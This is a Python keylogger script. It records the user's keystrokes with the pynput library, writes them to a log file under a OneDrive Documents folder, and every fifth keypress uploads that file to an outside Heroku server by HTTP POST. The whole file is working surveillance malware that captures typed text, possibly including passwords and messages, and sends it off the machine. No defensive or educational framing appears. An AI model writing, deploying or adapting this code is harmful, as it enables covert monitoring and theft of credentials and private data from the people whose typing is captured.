import os
import requests
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print(f'{key} pressed')

    if count == 5:
        write_file(keys)
        count = 0
        keys = []

def write_file(keys):
    file_path = os.path.expanduser("~/Onedrive/Documenti/keylogger/log.txt")
    
    with open(file_path, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
    
    # Carica il file sul server
    upload_to_server(file_path)

def upload_to_server(file_path):
    url = 'https://keylogger-d788557b2670.herokuapp.com/'
    with open(file_path, 'rb') as f:
        files = {'file': f}
        response = requests.post(url, files=files)
        print(response.json())

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
